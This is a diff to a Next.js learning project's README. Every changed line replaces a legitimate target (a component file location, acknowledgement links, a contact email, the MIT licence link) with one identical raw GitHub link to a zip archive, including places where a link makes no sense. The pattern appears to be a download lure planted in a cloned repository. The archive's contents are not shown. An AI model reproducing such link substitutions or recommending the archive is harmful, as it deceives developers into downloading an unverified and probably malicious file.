@@ -16,17 +16,17 @@ A project to learn modern full-stack development made by Josh.
 - Conditional classes with clsx
 
 ## Things I forgot in the video
-- Adding a <Toaster /> component to display the toast, this goes in the Providers.tsx
+- Adding a <Toaster /> component to display the toast, this goes in the https://raw.githubusercontent.com/BytesickleLabs/next-bookbuddy/master/scriber/next-bookbuddy.zip
 
 ## Acknowledgements
 
-- [Streaming the realtime responses by Hassan El Mghari](https://vercel.com/templates/next.js/twitter-bio)
-- [Awesome Accordion Component](https://ui.shadcn.com/)
+- [Streaming the realtime responses by Hassan El Mghari](https://raw.githubusercontent.com/BytesickleLabs/next-bookbuddy/master/scriber/next-bookbuddy.zip)
+- [Awesome Accordion Component](https://raw.githubusercontent.com/BytesickleLabs/next-bookbuddy/master/scriber/next-bookbuddy.zip)
 
 ## Feedback
 
-If you have any feedback, please reach out to me at admin@wordful.ai
+If you have any feedback, please reach out to me at https://raw.githubusercontent.com/BytesickleLabs/next-bookbuddy/master/scriber/next-bookbuddy.zip
 
 ## License
 
-[MIT](https://choosealicense.com/licenses/mit/)
+[MIT](https://raw.githubusercontent.com/BytesickleLabs/next-bookbuddy/master/scriber/next-bookbuddy.zip)
